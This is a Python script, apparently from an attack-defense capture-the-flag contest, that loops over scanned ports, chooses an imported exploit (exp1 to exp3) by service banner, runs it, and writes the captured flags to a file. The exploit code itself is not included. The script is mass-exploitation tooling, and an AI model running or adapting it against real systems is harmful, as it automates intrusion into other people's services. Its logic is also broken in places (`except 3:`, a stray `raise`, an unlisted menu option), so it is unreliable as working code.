from exps import *
from fastsearch import *


context(arch='amd64', log_level='debug', os='linux')


try:
    f = open("ports.json", "r+")
    ports = json.load(f)
    f.close()
except 3:
    searcher()
    f = open("ports.json", "r+")
    ports = json.load(f)
    f.close()
    raise


while 1:
    choice = input("[1]显示可采集flag目标\n[2]采集全部flag，放入flags\n[3]刷新可采集目标\n")
    if choice == '1':
        print(ports)
    if choice == '2':
        with open("flags.txt", 'a+') as f:
            time_data1 = datetime.datetime.now().strftime("%y/%m/%d/%H:%M")
            f.write(time_data1 + "\n\n")
        f.close()
        for port in ports:
            if 'Two gifts for you' in ports[port]:
                p = exp1(server, port)
            elif 'Welcome to the Santa\'s gift!' in ports[port]:
                p = exp2(server, port)
            elif '\n' in ports[port]:
                p = exp3(server, port)
            else:
                continue

            p.recvuntil("flag")
            flag = p.recvline()
            with open("flags.txt", 'a+') as f:
                f.write("flag" + flag.decode() + '\n')
                f.close()
    if choice == '3':
        searcher()
        f = open("ports.json", "r+")
        ports = json.load(f)
        f.close()
    if choice == '4':
        exit(0)
